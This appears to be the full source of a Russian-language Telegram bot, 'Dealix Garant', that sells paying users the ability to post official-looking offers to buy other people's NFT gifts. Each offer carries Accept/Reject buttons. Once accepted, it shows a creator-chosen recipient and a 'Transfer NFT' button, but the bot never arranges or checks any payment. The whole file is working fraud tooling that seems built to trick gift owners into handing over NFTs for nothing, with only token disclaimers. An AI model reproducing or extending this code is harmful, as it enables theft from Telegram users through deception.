
import { InlineKeyboard } from "grammy";
import { randomBytes } from "node:crypto";
import fs from "node:fs";
import path from "node:path";

const BOT_USERNAME = "DealixGarant_Bot";
const ACCESS_PRICE = 100;
const OFFER_LIFETIME = 6 * 60 * 60 * 1000;

const DATA_FILE = path.join(
  process.env.DATA_DIR || process.cwd(),
  "dealix-data.json"
);

function loadData() {
  try {
    return JSON.parse(
      fs.readFileSync(DATA_FILE, "utf8")
    );
  } catch (error) {
    if (error.code !== "ENOENT") throw error;
    return {
      users: {},
      offers: {},
      payments: {},
      invoices: {}
    };
  }
}

const db = loadData();
db.users ??= {};
db.offers ??= {};
db.payments ??= {};
db.invoices ??= {};

function save() {
  fs.mkdirSync(path.dirname(DATA_FILE), {
    recursive: true
  });

  const tmp = DATA_FILE + ".tmp";

  fs.writeFileSync(
    tmp,
    JSON.stringify(db, null, 2)
  );

  fs.renameSync(tmp, DATA_FILE);
}

function makeId() {
  return randomBytes(8).toString("hex");
}

function account(id) {
  const key = String(id);

  if (!db.users[key]) {
    db.users[key] = {
      paid: false,
      recipient: ""
    };
  }

  return db.users[key];
}

function hasAccess(id) {
  return account(id).paid === true;
}

function validUsername(value) {
  return /^@[A-Za-z][A-Za-z0-9_]{4,31}$/.test(
    value
  );
}

function parseOffer(text) {
  const match = String(text || "").trim().match(
    /^(?:offer\s+)?(?:https?:\/\/)?(?:www\.)?(?:t\.me|telegram\.me)\/nft\/([A-Za-z0-9_-]+)-(\d+)\/?\s+(\d+)(?:\s+(@[A-Za-z0-9_]+))?$/i
  );

  if (!match) return null;

  const price = Number(match[3]);

  if (
    !Number.isSafeInteger(price) ||
    price < 1 ||
    price > 100000000
  ) return null;

  if (
    match[4] &&
    !validUsername(match[4])
  ) return null;

  const slug = match[1];
  const number = match[2];

  const name = slug
    .replace(/([a-z])([A-Z])/g, "$1 $2")
    .replace(/([A-Z]+)([A-Z][a-z])/g, "$1 $2");

  return {
    gift: `${name} #${number}`,
    compactGift: `${slug}#${number}`,
    url: `https://t.me/nft/${slug}-${number}`,
    price,
    recipientOverride: match[4] || null
  };
}

function createOffer(data, from) {
  const recipient =
    data.recipientOverride ||
    account(from.id).recipient;

  if (!recipient) return null;

  const key = makeId();

  db.offers[key] = {
    ...data,
    recipient,
    creatorId: from.id,
    buyer: from.first_name || "Пользователь",
    status: "active",
    acceptedBy: null,
    createdAt: Date.now(),
    expiresAt: Date.now() + OFFER_LIFETIME
  };

  save();
  return key;
}

function preview(url) {
  return {
    is_disabled: false,
    url,
    prefer_large_media: true,
    show_above_text: true
  };
}

function remainingTime(offer) {
  const ms = Math.max(
    0,
    offer.expiresAt - Date.now()
  );

  const minutes = Math.ceil(ms / 60000);
  const hours = Math.floor(minutes / 60);
  const mins = minutes % 60;

  return `${hours} ч. ${mins} мин.`;
}

function offerText(o) {
  return (
    `${o.url}\n\n` +
    `Пользователь ${o.buyer} предлагает ` +
    `Вам ${o.price} ⭐ за коллекционный ` +
    `предмет ${o.compactGift}.\n\n` +
    `Предложение действует ещё ` +
    `${remainingTime(o)}\n\n` +
    `Оплата NFT не подтверждена.`
  );
}

function acceptedText(o) {
  return (
    `${o.url}\n\n` +
    `🎁 Коллекционный предмет: ` +
    `${o.compactGift}\n\n` +
    `✅ Предложение о покупке принято.\n\n` +
    `Покупатель предлагает ${o.price} ⭐ ` +
    `за NFT-подарок.\n\n` +
    `Получатель: ${o.recipient}\n\n` +
    `Оплата и передача подарка ` +
    `ожидают подтверждения.\n\n` +
    `Не передавайте NFT до подтверждения ` +
    `безопасного способа оплаты.`
  );
}

function offerButtons(key) {
  return new InlineKeyboard()
    .text("Отклонить", `reject:${key}`)
    .text("Принять", `accept:${key}`);
}

function acceptedButtons(key) {
  const o = db.offers[key];

  return new InlineKeyboard()
    .url("Передать NFT", o.url)
    .row()
    .text(
      "Подтвердить передачу",
      `sent:${key}`
    );
}

function alert(ctx, message) {
  return ctx.answerCallbackQuery({
    text: message,
    show_alert: true
  });
}

export function registerCommands(bot) {

  // START
  bot.command("start", async ctx => {
    const user = account(ctx.from.id);

    if (!user.paid) {
      const keyboard = new InlineKeyboard()
        .text(
          "⭐ Купить доступ — 100 Stars",
          "buy_access"
        );

      return ctx.reply(
        "🎁 Dealix Garant | NFT Offers\n\n" +
        "Создавайте предложения о покупке " +
        "коллекционных подарков Telegram.\n\n" +
        "Стоимость: 100 ⭐\n" +
        "Срок доступа: бессрочно.\n" +
        "Оплата: один раз.\n\n" +
        "После оплаты доступны:\n" +
        "• Команда /offer\n" +
        "• Inline Mode\n" +
        "• Свой @username получателя\n\n" +
        "Бот создаёт предложения пользователей, " +
        "но не гарантирует оплату NFT.",
        { reply_markup: keyboard }
      );
    }

    await ctx.reply(
      "🎁 Dealix Garant | NFT Offers\n\n" +
      "✅ Постоянный доступ активен.\n\n" +
      `Получатель: ${
        user.recipient || "не указан"
      }\n\n` +
      "Указать получателя:\n" +
      "/recipient @Mazviro\n\n" +
      "Создать предложение:\n" +
      "/offer t.me/nft/SkyStilettos-41219 4999\n\n" +
      "Inline Mode:\n" +
      `@${BOT_USERNAME} offer ` +
      "t.me/nft/SkyStilettos-41219 4999"
    );
  });

  // SEND INVOICE
  async function sendAccessInvoice(ctx) {
    if (ctx.chat?.type !== "private") {
      return ctx.reply(
        "Откройте личный чат с ботом для оплаты."
      );
    }

    if (hasAccess(ctx.from.id)) {
      return ctx.reply(
        "✅ У вас уже есть постоянный доступ."
      );
    }

    const payload =
      `access:${ctx.from.id}:${makeId()}`;

    db.invoices[payload] = {
      userId: ctx.from.id,
      amount: ACCESS_PRICE,
      createdAt: Date.now()
    };

    save();

    await ctx.api.sendInvoice(
      ctx.chat.id,
      "NFT Offers — постоянный доступ",
      "Однократная покупка доступа к " +
      "созданию NFT-предложений.",
      payload,
      "XTR",
      [
        {
          label: "Постоянный доступ",
          amount: ACCESS_PRICE
        }
      ],
      {
        provider_token: ""
      }
    );
  }

  bot.command("buy", sendAccessInvoice);

  bot.callbackQuery("buy_access", async ctx => {
    await ctx.answerCallbackQuery();

    if (ctx.chat?.type !== "private") {
      return;
    }

    await sendAccessInvoice(ctx);
  });

  // PAYMENT VERIFICATION
  bot.on("pre_checkout_query", async ctx => {
    const q = ctx.preCheckoutQuery;
    const invoice = db.invoices[q.invoice_payload];

    const valid =
      invoice &&
      invoice.userId === q.from.id &&
      invoice.amount === ACCESS_PRICE &&
      q.currency === "XTR" &&
      q.total_amount === ACCESS_PRICE;

    if (!valid) {
      return ctx.answerPreCheckoutQuery(
        false,
        {
          error_message:
            "Счёт не найден. Создайте новый через /buy."
        }
      );
    }

    await ctx.answerPreCheckoutQuery(true);
  });

  // SUCCESSFUL PAYMENT
  bot.on("message:successful_payment", async ctx => {
    const payment = ctx.message.successful_payment;

    const invoice =
      db.invoices[payment.invoice_payload];

    if (
      !invoice ||
      invoice.userId !== ctx.from.id ||
      payment.currency !== "XTR" ||
      payment.total_amount !== ACCESS_PRICE
    ) {
      console.error(
        "Unexpected payment:",
        payment.invoice_payload
      );
      return;
    }

    const chargeId =
      payment.telegram_payment_charge_id;

    if (!db.payments[chargeId]) {
      db.payments[chargeId] = {
        userId: ctx.from.id,
        amount: ACCESS_PRICE,
        date: Date.now()
      };

      account(ctx.from.id).paid = true;
      delete db.invoices[payment.invoice_payload];

      save();
    }

    await ctx.reply(
      "✅ Оплата успешно получена!\n\n" +
      "Стоимость: 100 ⭐\n" +
      "Доступ: бессрочный.\n\n" +
      "Укажите получателя NFT:\n" +
      "/recipient @Mazviro\n\n" +
      "Затем создайте предложение через /offer."
    );
  });

  // RECIPIENT
  bot.command("recipient", async ctx => {
    if (!hasAccess(ctx.from.id)) {
      return ctx.reply(
        "🔒 Для использования функции " +
        "приобретите доступ через /buy."
      );
    }

    const recipient =
      String(ctx.match || "").trim();

    if (!validUsername(recipient)) {
      return ctx.reply(
        "Укажите username получателя.\n\n" +
        "Пример:\n/recipient @Mazviro"
      );
    }

    account(ctx.from.id).recipient = recipient;
    save();

    await ctx.reply(
      "✅ Получатель установлен.\n\n" +
      `Username: ${recipient}\n\n` +
      "Новые предложения будут использовать " +
      "этого получателя."
    );
  });

  // STATUS
  bot.command("status", async ctx => {
    const user = account(ctx.from.id);

    await ctx.reply(
      "👤 Статус аккаунта\n\n" +
      `Доступ: ${
        user.paid
          ? "Постоянный"
          : "Не оплачен"
      }\n` +
      `Получатель: ${
        user.recipient || "не указан"
      }`
    );
  });

  // CREATE OFFER
  bot.command("offer", async ctx => {
    if (ctx.chat.type !== "private") {
      return ctx.reply(
        "Используйте /offer в личном чате с ботом."
      );
    }

    if (!hasAccess(ctx.from.id)) {
      return ctx.reply(
        "🔒 Доступ к созданию предложений: 100 ⭐.\n" +
        "Однократная оплата: /buy"
      );
    }

    const data = parseOffer(ctx.match || "");

    if (!data) {
      return ctx.reply(
        "Неверный формат.\n\n" +
        "/offer t.me/nft/SkyStilettos-41219 4999"
      );
    }

    const key = createOffer(data, ctx.from);

    if (!key) {
      return ctx.reply(
        "Сначала установите получателя:\n" +
        "/recipient @username"
      );
    }

    const o = db.offers[key];

    await ctx.reply(
      offerText(o),
      {
        reply_markup: offerButtons(key),
        link_preview_options: preview(o.url)
      }
    );
  });

  // INLINE MODE
  bot.inlineQuery(/.*/, async ctx => {
    if (!hasAccess(ctx.from.id)) {
      return ctx.answerInlineQuery([], {
        cache_time: 0,
        is_personal: true,
        button: {
          text: "Купить доступ за 100 ⭐",
          start_parameter: "access"
        }
      });
    }

    const data = parseOffer(ctx.inlineQuery.query);

    if (!data) {
      return ctx.answerInlineQuery([], {
        cache_time: 0,
        is_personal: true
      });
    }

    const key = createOffer(data, ctx.from);

    if (!key) {
      return ctx.answerInlineQuery([], {
        cache_time: 0,
        is_personal: true,
        button: {
          text: "Указать получателя NFT",
          start_parameter: "recipient"
        }
      });
    }

    const o = db.offers[key];

    await ctx.answerInlineQuery(
      [
        {
          type: "article",
          id: key,
          title: `${o.gift} — ${o.price} ⭐`,
          description:
            "Отправить NFT-предложение",
          input_message_content: {
            message_text: offerText(o),
            link_preview_options: preview(o.url)
          },
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Отклонить",
                  callback_data: `reject:${key}`
                },
                {
                  text: "Принять",
                  callback_data: `accept:${key}`
                }
              ]
            ]
          }
        }
      ],
      {
        cache_time: 0,
        is_personal: true
      }
    );
  });

  // ACCEPT
  bot.callbackQuery(
    /^accept:([a-f0-9]+)$/,
    async ctx => {
      const key = ctx.match[1];
      const o = db.offers[key];

      if (!o || o.status !== "active") {
        return alert(
          ctx,
          "Предложение недоступно."
        );
      }

      if (Date.now() >= o.expiresAt) {
        o.status = "expired";
        save();

        return alert(
          ctx,
          "Срок действия предложения истёк."
        );
      }

      if (ctx.from.id === o.creatorId) {
        return alert(
          ctx,
          "Нельзя принять собственное предложение."
        );
      }

      o.status = "accepted";
      o.acceptedBy = ctx.from.id;
      save();

      await alert(
        ctx,
        "✅ Предложение принято.\n" +
        "Оплата NFT не подтверждена."
      );

      try {
        await ctx.editMessageText(
          acceptedText(o),
          {
            reply_markup: acceptedButtons(key),
            link_preview_options: preview(o.url)
          }
        );
      } catch (error) {
        console.error(
          "Failed to edit accepted offer:",
          error
        );
      }
    }
  );

  // REJECT
  bot.callbackQuery(
    /^reject:([a-f0-9]+)$/,
    async ctx => {
      const key = ctx.match[1];
      const o = db.offers[key];

      if (!o || o.status !== "active") {
        return alert(
          ctx,
          "Предложение недоступно."
        );
      }

      if (Date.now() >= o.expiresAt) {
        o.status = "expired";
        save();

        return alert(
          ctx,
          "Срок действия предложения истёк."
        );
      }

      if (ctx.from.id === o.creatorId) {
        return alert(
          ctx,
          "Нельзя отклонить собственное предложение."
        );
      }

      o.status = "rejected";
      save();

      await alert(
        ctx,
        "Предложение отклонено."
      );

      try {
        await ctx.editMessageReplyMarkup({
          reply_markup: new InlineKeyboard()
        });
      } catch (error) {
        console.error(error);
      }
    }
  );

  // CONFIRM TRANSFER
  bot.callbackQuery(
    /^sent:([a-f0-9]+)$/,
    async ctx => {
      const o = db.offers[ctx.match[1]];

      if (
        !o ||
        o.status !== "accepted" ||
        o.acceptedBy !== ctx.from.id
      ) {
        return alert(
          ctx,
          "Предложение недоступно."
        );
      }

      await alert(
        ctx,
        "❌ Передача подарка не подтверждена."
      );
    }
  );
}



